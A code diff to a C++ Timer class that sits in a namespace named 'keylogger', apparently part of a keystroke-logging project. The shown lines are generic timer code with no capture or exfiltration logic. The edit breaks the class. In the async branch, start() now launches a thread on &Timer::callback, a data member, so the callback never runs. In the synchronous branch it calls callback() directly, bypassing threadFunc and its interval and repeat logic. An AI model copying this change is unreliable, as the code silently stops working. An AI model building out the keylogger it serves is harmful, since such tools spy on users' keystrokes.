@@ -3,7 +3,7 @@
 namespace keylogger
 {
 Timer::Timer(std::function<void(void)> f) : callback{std::move(f)} {}
-Timer::Timer(std::function<void(void)> f, const unsigned long i, const long repeat)
+Timer::Timer(std::function<void(void)> f, unsigned long i, long repeat)
     : callback{std::move(f)}, interval{std::chrono::milliseconds(i)}, totalNumberOfCalls{repeat}
 {
 }
@@ -18,11 +18,11 @@ void Timer::start(bool async)
     callsCounter = totalNumberOfCalls;
     if (async)
     {
-        thread = std::thread(&Timer::threadFunc, this);
+        thread = std::thread(&Timer::callback, this);
     }
     else
     {
-        threadFunc();
+        callback();
     }
 }
 
@@ -42,7 +42,7 @@ void Timer::setTimerCallback(const std::function<void(void)>& f)
     callback = f;
 }
 
-void Timer::setTotalNumberOfCalls(const long num)
+void Timer::setTotalNumberOfCalls(long num)
 {
     if (isAlive())
     {
@@ -51,7 +51,7 @@ void Timer::setTotalNumberOfCalls(const long num)
     totalNumberOfCalls = num;
 }
 
-void Timer::setInterval(const unsigned long i)
+void Timer::setInterval(unsigned long i)
 {
     if (isAlive())
     {
